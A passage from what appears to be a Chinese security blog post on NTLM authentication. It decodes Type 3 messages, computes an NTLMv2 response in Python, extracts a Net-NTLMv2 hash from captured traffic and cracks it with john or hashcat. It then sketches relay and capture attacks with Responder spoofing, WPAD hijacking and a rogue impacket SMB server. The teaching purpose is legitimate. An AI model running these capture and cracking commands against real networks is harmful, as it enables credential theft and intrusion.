NTLMRevisionCurrent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4400430030003100020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd801</span><br><span class="line">.....后面接着的payload信息就是TargetName、Targetinfo的信息</span><br><span class="line"></span><br><span class="line">00000000 结束字段块</span><br></pre></td></tr></table></figure>

<p>在服务器创建Type2消息后，将会将Type2消息发送给客户端。</p>
<h3 id="Type-3-验证"><a href="#Type-3-验证" class="headerlink" title="Type 3 验证"></a>Type 3 验证</h3><p>Type3消息是身份验证的最后一步，该步骤是客户端对Type2消息的响应，客户端将使用输入的NTLM-Hash对服务器随机生成的Challenge值进行复杂的加密运算得到Response，将其作为Type3消息发送给服务器。<br>Response是最关键的部分是它向服务器证明了客户端知道用户的帐号密码。服务器收到客户端发送的Type3消息，会判断用户名是本地用户还是域用户名，如果是本地用户将会在SAM中找到这个用户的NTLM-Hash，并从客户端发送的Type3消息中提取相关字段，和客户端进行几乎一样的加密运算，最后得到的Response将会和客户端发送的Response进行比较，如果一致则认证通过。如果是在域用户的话，服务器会通过Netlogon安全通道，将Response、Username、ServerChallenge转发给域控，将验证工作交给去进行，DC将会返回结果给服务器，服务器再根据DC的响应返回给客户端。</p>
<table>
<thead>
<tr>
<th></th>
<th>Description</th>
<th>Content</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>NTLMSSP Signature</td>
<td>Null-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)</td>
</tr>
<tr>
<td>8</td>
<td>NTLM Message Type</td>
<td>long (0x03000000)</td>
</tr>
<tr>
<td>12</td>
<td>LM&#x2F;LMv2 Response</td>
<td>security buffer</td>
</tr>
<tr>
<td>20</td>
<td>NTLM&#x2F;NTLMv2 Response</td>
<td>security buffer</td>
</tr>
<tr>
<td>28</td>
<td>Target Name</td>
<td>security buffer</td>
</tr>
<tr>
<td>36</td>
<td>User Name</td>
<td>security buffer</td>
</tr>
<tr>
<td>44</td>
<td>Workstation Name</td>
<td>security buffer</td>
</tr>
<tr>
<td>(52)</td>
<td>Session Key (optional)</td>
<td>security buffer</td>
</tr>
<tr>
<td>(60)</td>
<td>Flags(optional)</td>
<td>security buffer</td>
</tr>
<tr>
<td>(64)</td>
<td>OS Version Structure (Optional)</td>
<td>8 bytes</td>
</tr>
<tr>
<td>52 (64) (72)</td>
<td>start of data block</td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://images.atsud0.me/images/post/20220311-17:54:39-_NSUlYG_image-20220311175439495_NSUlYG_1646992479902_NSUlYG_image-20220311175439495.png" alt="image-20220311175439495"></p>
<p>Signature (8 bytes):  8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\0’)</p>
<p>MessageType (4 bytes): 表示消息类型，值必须为0x0000003。</p>
<p>The LM&#x2F;LMv2 and NTLM&#x2F;NTLMv2 responses LM&#x2F;LMv2 NTLM&#x2F;NTLMv2这两个响应是客户端收到Type2消息用用户输入的密码hash对Challege生成的。</p>
<p>LmChallengeResponseFields(8 bytes)，包含LmChallengeResponseLen(2 bytes)、LmChallengeResponseMaxLen(2 bytes)、LmChallengeResponseBufferOffset(4 bytes)字段。如果客户端不发送LmChallengeResponse，Len字段则为0。<br>NtChallengeResponseFields (8 bytes)，包含NTChallengeResponseLen(2 bytes)、NTChallengeResponseMaxLen(2 bytes)、NTChallengeResponseBufferOffset(4 bytes)字段。如果客户端不发送NTChallengeResponse，Len字段则为0。</p>
<p>DomainNameFields (8 bytes)，包含DomainNameLen(2 bytes)、DomainNameMaxLen(2 bytes)、DomainNameBufferOffset(4 bytes)字段。如果客户端不发送DomainName，Len字段应为0。</p>
<p>UserNameFields (8 bytes),，包含UserNameLen(2 bytes)、UserNameMaxLen(2 bytes)、UserNameBufferOffset(4 bytes)字段。如果客户端不发送UserName，Len字段应为0。</p>
<p>NegotiateFlags (4 bytes):这里表示的是客户端协商的配置。</p>
<p>这里细说下 NTChallengeResponse，NTChallengeResponse的结构为</p>
<table>
<thead>
<tr>
<th></th>
<th>Description</th>
<th>Content</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>Response（ntlmssp.ntlmv2_response.ntproofstr）16bytes</td>
<td></td>
</tr>
<tr>
<td></td>
<td>NTLMv2_CLIENT_CHALLENGE</td>
<td></td>
</tr>
</tbody></table>
<p>而NTLMv2_CLIENT_CHALLENGE（Blob）的结构是这样的</p>
<table>
<thead>
<tr>
<th></th>
<th>Description</th>
<th>Content</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>Blob Signature</td>
<td>0x01010000</td>
</tr>
<tr>
<td>4</td>
<td>Reserved</td>
<td>long (0x00000000)</td>
</tr>
<tr>
<td>8</td>
<td>Timestamp</td>
<td>表示自1月1日1601年1月1日以來微秒的十分之一</td>
</tr>
<tr>
<td>16</td>
<td>Client Nonce（NTLMv2 Client Challenge）</td>
<td>8 bytes（随机生成）</td>
</tr>
<tr>
<td>24</td>
<td>Unknown</td>
<td>4 bytes（0x00000000）</td>
</tr>
<tr>
<td>28</td>
<td>Target Information</td>
<td>从type2阶段来的目标信息块</td>
</tr>
<tr>
<td></td>
<td>Unknown</td>
<td>4bytes</td>
</tr>
</tbody></table>
<p>想了解每个字段的含义还是得去看官方文档<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce">AUTHENTICATE_MESSAGE</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">例子:4e544c4d5353500003000000180018005a000000f000f0007200000000000000400000001a001a0040000000000000005a0000000000000062010000050288a0410064006d0069006e006900730074007200610074006f0072001a8e5080fb4a6f0a8bf3e0669eb146f37a735845757168659a792665c56f71be45ecbe9c7d7a99b0010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000</span><br><span class="line"></span><br><span class="line">4e544c4d53535000 NTLMSSP Signature</span><br><span class="line"></span><br><span class="line">03000000 NTLM Message Type</span><br><span class="line"></span><br><span class="line">180018005a000000  LM/LMv2 Respons</span><br><span class="line">1800 = 0x0018 = 24 Len &amp; MaxLen</span><br><span class="line">5a000000 = 0x0000005a = 90 Offset LM/LMv2 Respons出现的位置是第90个字节的时候，长度为24。</span><br><span class="line"></span><br><span class="line">f000f00072000000 NTLM/NTLMv2 Response</span><br><span class="line">f000=0x00f0 = 240 Len &amp; MaxLen</span><br><span class="line">72000000 = 0x00000072 = 114 Offset NTLM/NTLMv2 Respons出现的位置是第240个字节的时候，Offset为114。</span><br><span class="line"></span><br><span class="line">0000000040000000 Domain Name</span><br><span class="line">0000=0x0000 Len为0 ，DomainName为空</span><br><span class="line">40000000 = 0x00000040 Offset</span><br><span class="line"></span><br><span class="line">1a001a0040000000 UserName</span><br><span class="line">1a00 = 0x001a  =26 Len &amp; MaxLen</span><br><span class="line">40000000 =0x00000040 offset username 长度26</span><br><span class="line"></span><br><span class="line">000000005a000000 HostName</span><br><span class="line">0000=0x0000 Len为0 ，空</span><br><span class="line">5a000000 = 0x0000005a = 90 Offset</span><br><span class="line"></span><br><span class="line">0000000062010000 SessionsKeys</span><br><span class="line">0000=0x0000 Len为0 ，空</span><br><span class="line">62010000 = 0x00000162 offset</span><br><span class="line"></span><br><span class="line">050288a0 Flags 和Type1的相同</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">410064006d0069006e006900730074007200610074006f007200 Offset:64 长度26 A d m i n i s t r a t o r因为是unicode，所以长度是2倍</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1a8e5080fb4a6f0a8bf3e0669eb146f37a73584575716865 Offset:90 长度24 LM/LMv2 Respons</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9a792665c56f71be45ecbe9c7d7a99b0010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000 NTLM/NTLMv2Response</span><br><span class="line"></span><br><span class="line">Response 9a792665c56f71be45ecbe9c7d7a99b0</span><br><span class="line">Blob 010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000</span><br><span class="line"></span><br><span class="line">Blob Signature   4bytes : 01010000 =0x01010000</span><br><span class="line">Reserved 4 bytes : 00000000 = 0x00000000</span><br><span class="line">Timestamp 8 bytes: 20b70cb6992bd801 = 0x20b70cb6992bd801</span><br><span class="line">client nonce 8bytes : 7a73584575716865 = 0x7a73584575716865</span><br><span class="line">end subblock: 00000000 = 0x00000000</span><br><span class="line">target information: 020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f005300450052005600450052003000310000000000</span><br><span class="line">enbsubblock: 00000000</span><br></pre></td></tr></table></figure>



<h4 id="The-NTLMv2-Response生成"><a href="#The-NTLMv2-Response生成" class="headerlink" title="The NTLMv2 Response生成"></a>The NTLMv2 Response生成</h4><p>这里注意NTLM&#x2F;NTLMv2Response，我们可以发现NTLMv2Response里面前16 Bytes是一段HMAC-MD5生成的值。被称为Response，或者是NTProofStr。这一段值的生成方式比较复杂，受客户端和服务端Flags（参数）的影响。</p>
<p>简单的介绍下最基础的生成方式(根据Flags的设置 加密方式会有所不同（比如如果是NTLMv2SessionResponse计算方式就会和下面的不一样）)</p>
<ol>
<li>将明文密码转换为NTLM-Hash(前面有介绍NTLM Hash生成方式)</li>
<li>将用户名转换为大写,然后和域名(域名区分大小写,但是必须和Type3包文中显示的域名一致)拼接在一起,然后进行Unicode的十六进制编码转换.(这里编码始终使用Unicode即使Flags中设置了OEM).NTLM Hash作为Key 对其进行Hmac Md5加密:HMAC_MD5(((UserName).Upper()+domainName),NTLM Hash)得到ntlmV2Hash</li>
<li>ServerChallenge和Blob进行拼接.使用第三步得到的ntlmV2hash对其进行加密:HMAC_MD5((ServerChallenge+Blob),ntlmv2hash)得到Response(NTProofStr)</li>
<li>将Response(NTProofStr)和Blob重新进行拼接 得到NTLMv2 Response.</li>
</ol>
<p>Examples(案例来自:<a target="_blank" rel="noopener" href="http://davenport.sourceforge.net/ntlm.html#theNtlmv2Response">TheNTLMv2Response</a>):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Target:DOMAIN</span><br><span class="line">Username:user</span><br><span class="line">Password:SecREt01</span><br><span class="line">ServerChallenge:0x123456789abcdef</span><br><span class="line">TargetInformation:0x02000c0044004f004d00410049004e0001000c005300450052005600450052000400140064006f006d00610069006e002e0063006f006d00030022007300650072007600650072002e0064006f006d00610069006e002e0063006f006d0000000000</span><br><span class="line">Timestamp:0x0090d336b734c301</span><br><span class="line">Client nonce:0xffffff0011223344</span><br><span class="line"></span><br><span class="line">ServerChallenge+Blob:</span><br><span class="line">0x0123456789abcdef01010000000000000090d336b734c301ffffff00112233440000000002000c0044004f004d00410049004e0001000c005300450052005600450052000400140064006f006d00610069006e002e0063006f006d00030022007300650072007600650072002e0064006f006d00610069006e002e0063006f006d000000000000000000</span><br></pre></td></tr></table></figure>
<p>大致的python代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">passwd=<span class="string">&quot;SecREt01&quot;</span></span><br><span class="line">unicode_hex_passwd = passwd.encode(<span class="string">&#x27;utf-16le&#x27;</span>)</span><br><span class="line">md4_passwd=hashlib.new(<span class="string">&quot;md4&quot;</span>,unicode_hex_passwd).digest()</span><br><span class="line"><span class="built_in">print</span>(passwd,binascii.hexlify(md4_passwd))</span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;user&quot;</span>.upper()</span><br><span class="line">domain = <span class="string">&quot;DOMAIN&quot;</span></span><br><span class="line"></span><br><span class="line">un_domain = username+domain</span><br><span class="line">hex_undomain = un_domain.encode(<span class="string">&#x27;utf-16le&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;un_domain&quot;</span>,binascii.hexlify(hex_undomain))</span><br><span class="line"></span><br><span class="line">enc_res = hmac.new(md4_passwd,hex_undomain,hashlib.md5).digest()</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(enc_res))</span><br><span class="line"></span><br><span class="line">sc_blob=<span class="string">b&quot;\x01\x23\x45\x67\x89\xab\xcd\xef\x01\x01\x00\x00\x00\x00\x00\x00\x00\x90\xd3\x36\xb7\x34\xc3\x01\xff\xff\xff\x00\x11\x22\x33\x44\x00\x00\x00\x00\x02\x00\x0c\x00\x44\x00\x4f\x00\x4d\x00\x41\x00\x49\x00\x4e\x00\x01\x00\x0c\x00\x53\x00\x45\x00\x52\x00\x56\x00\x45\x00\x52\x00\x04\x00\x14\x00\x64\x00\x6f\x00\x6d\x00\x61\x00\x69\x00\x6e\x00\x2e\x00\x63\x00\x6f\x00\x6d\x00\x03\x00\x22\x00\x73\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x2e\x00\x64\x00\x6f\x00\x6d\x00\x61\x00\x69\x00\x6e\x00\x2e\x00\x63\x00\x6f\x00\x6d\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">enc_res = hmac.new(enc_res,sc_blob,hashlib.md5).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(enc_res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220311-11:03:36-_Ac1pO9_igOVXs_Ac1pO9_1646967816288_Ac1pO9_igOVXs.png" alt="20220311-11:03:36-_Ac1pO9_igOVXs_Ac1pO9_1646967816288_Ac1pO9_igOVXs"></p>
<p>最后得到的Response将会和Blob重新拼接.成为NTLMv2 Response。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xcbabbca713eb795d04c97abc01ee498301010000000000000090d336b734c301ffffff00112233440000000002000c0044004f004d00410049004e0001000c005300450052005600450052000400140064006f006d00610069006e002e0063006f006d00030022007300650072007600650072002e0064006f006d00610069006e002e0063006f006d000000000000000000</span><br></pre></td></tr></table></figure>




<p>前面说到Response有六种格式，但是他们使用的加密流程都是一样，区别在于Challenge和加密算法不同，这里就不细展开说其他Response的生成方式了，感兴趣的还是去阅读推荐文章。（这里注意一下包文里的NTChallengeResponse并不等于net-ntlm hashv2）</p>
<p>而NTLM v1与NTLM v2区别就是Challenge与加密算法不同，共同点就是加密的都是NTLM Hash。<br>Net-NTLM Hash v1的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>
<p>Net-NTLM Hash v2的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:NTproofstring:modifiedntlmv2response</span><br></pre></td></tr></table></figure>

<h3 id="手动获取NTLM加密"><a href="#手动获取NTLM加密" class="headerlink" title="手动获取NTLM加密"></a>手动获取NTLM加密</h3><p>搜索ntlmssp</p>
<p><img src="https://images.atsud0.me/images/post/20220301-11:02:29-_RlWy0n_fao2Fa_RlWy0n_1646103749341_RlWy0n_fao2Fa.png" alt="https://images.atsud0.me/images/post/20220301-11:02:29-_RlWy0n_fao2Fa_RlWy0n_1646103749341_RlWy0n_fao2Fa.png"></p>
<p>找到NTLMSSP_AUTH的请求包，找到SMB2&#x2F;Security Blob层。</p>
<p><img src="https://images.atsud0.me/images/post/20220301-11:16:10-_sgloQU_vmHtjR_sgloQU_1646104570346_sgloQU_vmHtjR.png" alt="https://images.atsud0.me/images/post/20220301-11:16:10-_sgloQU_vmHtjR_sgloQU_1646104570346_sgloQU_vmHtjR.png"></p>
<p>在这里我们可以看到认证的用户名、域名（我这里用的是工作组）。复制用户名和域名记录起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UserName:Administrator</span><br><span class="line">DomainName:NULL</span><br></pre></td></tr></table></figure>

<p>接着继续找到NTLM Response部分，找到NTLMv2 Response和NTProofStr字段，将其以16进制字段复制，记录起来。</p>
<p><img src="https://images.atsud0.me/images/post/20220301-11:20:41-_hUXPKD_mFcIUW_hUXPKD_1646104841783_hUXPKD_mFcIUW.png" alt="https://images.atsud0.me/images/post/20220301-11:20:41-_hUXPKD_mFcIUW_hUXPKD_1646104841783_hUXPKD_mFcIUW.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NTLMv2 Response:9a792665c56f71be45ecbe9c7d7a99b0010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000</span><br><span class="line">NTProofStr:9a792665c56f71be45ecbe9c7d7a99b0</span><br></pre></td></tr></table></figure>

<p>将NTLMv2 Response开头和NTProofStr相同的部分值删掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NTProofStr的值是 9a792665c56f71be45ecbe9c7d7a99b0 删除之后的NTLMv2 Response字段是:</span><br><span class="line">010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000</span><br></pre></td></tr></table></figure>

<p>接着过滤ntlmssp.serverchallenge的请求包</p>
<p><img src="https://images.atsud0.me/images/post/20220301-11:45:51-_Ul0i6a_yXC7Ii_Ul0i6a_1646106351100_Ul0i6a_yXC7Ii.png" alt="https://images.atsud0.me/images/post/20220301-11:45:51-_Ul0i6a_yXC7Ii_Ul0i6a_1646106351100_Ul0i6a_yXC7Ii.png"></p>
<p>同样也是过滤SMB2&#x2F;Security Blob层。找到NTLM Server Challenge值</p>
<p><img src="https://images.atsud0.me/images/post/20220301-11:47:31-_gEqz2i_9GWkOc_gEqz2i_1646106451085_gEqz2i_9GWkOc.png" alt="https://images.atsud0.me/images/post/20220301-11:47:31-_gEqz2i_9GWkOc_gEqz2i_1646106451085_gEqz2i_9GWkOc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLMServerChallenge:dea8b91964571623</span><br></pre></td></tr></table></figure>

<p>然后按照以下字段组合在一起，保存到文本，然后就可以使用工具进行破解了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br><span class="line"></span><br><span class="line">Administrator:::dea8b91964571623:9a792665c56f71be45ecbe9c7d7a99b0:010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000</span><br></pre></td></tr></table></figure>

<p>使用john进行破解</p>
<p><img src="https://images.atsud0.me/images/post/20220301-11:55:20-_DDWeBU_AY8Egu_DDWeBU_1646106920032_DDWeBU_AY8Egu.png" alt="https://images.atsud0.me/images/post/20220301-11:55:20-_DDWeBU_AY8Egu_DDWeBU_1646106920032_DDWeBU_AY8Egu.png"></p>
<h3 id="脚本获取NTLM加密"><a href="#脚本获取NTLM加密" class="headerlink" title="脚本获取NTLM加密"></a>脚本获取NTLM加密</h3><p>可以使用<a target="_blank" rel="noopener" href="https://github.com/mlgualtieri/NTLMRawUnHide">脚本</a>，指定已经捕获了NTLM请求的pcap包进行获取。</p>
<p><img src="https://images.atsud0.me/images/post/20220301-10:52:24-_WMlI0w_e1Gfer_WMlI0w_1646103144707_WMlI0w_e1Gfer.png" alt="https://images.atsud0.me/images/post/20220301-10:52:24-_WMlI0w_e1Gfer_WMlI0w_1646103144707_WMlI0w_e1Gfer.png"></p>
<p>然后可以使用hashcat进行破解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt passwordlist.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220301-10:57:42-_kUNQOx_7vSCj7_kUNQOx_1646103462485_kUNQOx_7vSCj7.png" alt="https://images.atsud0.me/images/post/20220301-10:57:42-_kUNQOx_7vSCj7_kUNQOx_1646103462485_kUNQOx_7vSCj7.png"></p>
<h2 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP &amp; SSPI"></a>SSP &amp; SSPI</h2><p>SSPI: Security Support Provider Interface 就是SSP的API接口，可以理解为该接口定义了很多安全有关的功能函数，但是没有具体的实现。然后SSP就是SSPI的实现。</p>
<p>SSP： Security Support Provider，直译为安全支持提供者，又名Security Package.可以理解为SSP就是一个DLL。微软实现了以下SSP，用于提供安全功能：</p>
<ol>
<li>NTLM SSP</li>
<li>Kerberos</li>
<li>Cred SSP</li>
<li>Digest SSP</li>
<li>Negotiate SSP</li>
<li>Schannel SSP</li>
<li>Negotiate Extensions SSP</li>
<li>PKU2U SSP</li>
</ol>
<p>在系统层面，SSP就是一个DLL用于实现身份验证功能，NTLM是基于Challenge&#x2F;Response机制，Kerberos是基于ticket的身份验证。所以，我们也可以实现自己的SSP，让系统实现更多的身份验证方法，比如Mimikatz就自己实现了一个利用SSP机制的记录密码。</p>
<p>在抓包分析的时候，我们也能看见ntlmssp是在gssapi下面的。</p>
<p><img src="https://images.atsud0.me/images/post/20220303-16:31:44-_5qygz1_tvdw16_5qygz1_1646296304511_5qygz1_tvdw16.png" alt="20220303-16:31:44-_5qygz1_tvdw16_5qygz1_1646296304511_5qygz1_tvdw16"></p>
<blockquote>
<p>因为sspi是gssapi的变体，这里出现gssapi是为了兼容。注册为SSP的好处就是，SSP实现了了与安全有关的功能函数，那上层协议(比如SMB)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面。不像kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。ntlm是只能镶嵌在上层协议里面，消息的传输依赖于使用ntlm的上层协议。</p>
</blockquote>
<p>比如SMB：<br><img src="https://images.atsud0.me/images/post/20220303-17:16:29-_qOnRbO_Lhazy7_qOnRbO_1646298989782_qOnRbO_Lhazy7.png" alt="20220303-17:16:29-_qOnRbO_Lhazy7_qOnRbO_1646298989782_qOnRbO_Lhazy7"></p>
<p>HTTP是这样的：<br><img src="https://images.atsud0.me/images/post/20220303-17:20:19-_Ctuelz_gbonvT_Ctuelz_1646299219363_Ctuelz_gbonvT.png" alt="20220303-17:20:19-_Ctuelz_gbonvT_Ctuelz_1646299219363_Ctuelz_gbonvT"></p>
<h1 id="0x02-NTLM-Relay"><a href="#0x02-NTLM-Relay" class="headerlink" title="0x02 NTLM Relay"></a>0x02 NTLM Relay</h1><p><strong>攻击方式待更新</strong></p>
<p>在上面的认证过程中，我们知道了正常的ntlm认证流程是这样的：<br><img src="https://images.atsud0.me/images/post/20220303-17:28:51-_mbVsXn_zIn4i2_mbVsXn_1646299731095_mbVsXn_zIn4i2.png" alt="20220303-17:28:51-_mbVsXn_zIn4i2_mbVsXn_1646299731095_mbVsXn_zIn4i2"></p>
<p>如果这个时候有个中间人出现的话：</p>
<p><img src="https://images.atsud0.me/images/post/20220303-17:34:41-_C20tRl_YBxFQE_C20tRl_1646300081235_C20tRl_YBxFQE.png" alt="20220303-17:34:41-_C20tRl_YBxFQE_C20tRl_1646300081235_C20tRl_YBxFQE"></p>
<p>作为中间人，攻击者会将来自客户端的包转发给服务端，在将服务端的包转发给客户端，客户端生成Response后，再把type3包转发给服务端，服务端验证通过后，服务器将会授予攻击者访问的权限。</p>
<h2 id="Responder-利用LLMNR和NetBIOS欺骗-WPAD劫持-获得Net-NTLMHash"><a href="#Responder-利用LLMNR和NetBIOS欺骗-WPAD劫持-获得Net-NTLMHash" class="headerlink" title="Responder 利用LLMNR和NetBIOS欺骗 WPAD劫持 获得Net-NTLMHash"></a>Responder 利用LLMNR和NetBIOS欺骗 WPAD劫持 获得Net-NTLMHash</h2><p>Kali上默认有,所以不用安装了(</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth1</span><br></pre></td></tr></table></figure>

<p>诱导受害者访问:</p>
<p><img src="https://images.atsud0.me/images/post/20220308-19:44:08-_v5MaK5_ePTgZa_v5MaK5_1646739848993_v5MaK5_ePTgZa.png" alt="20220308-19:44:08-_v5MaK5_ePTgZa_v5MaK5_1646739848993_v5MaK5_ePTgZa"></p>
<h2 id="WPAD劫持"><a href="#WPAD劫持" class="headerlink" title="WPAD劫持"></a>WPAD劫持</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth1 </span><br></pre></td></tr></table></figure>

<h2 id="打印机漏洞-PrintBug"><a href="#打印机漏洞-PrintBug" class="headerlink" title="打印机漏洞 PrintBug"></a>打印机漏洞 PrintBug</h2><h2 id="Kali部署SMBServer抓NTLM哈希"><a href="#Kali部署SMBServer抓NTLM哈希" class="headerlink" title="Kali部署SMBServer抓NTLM哈希"></a>Kali部署SMBServer抓NTLM哈希</h2><p>使用smbserver起一个服务，受害机直接访问攻击机部署的SMB也能捕获到NTLM加密的哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver test /tmp -port 445</span><br></pre></td></tr></table></figure>

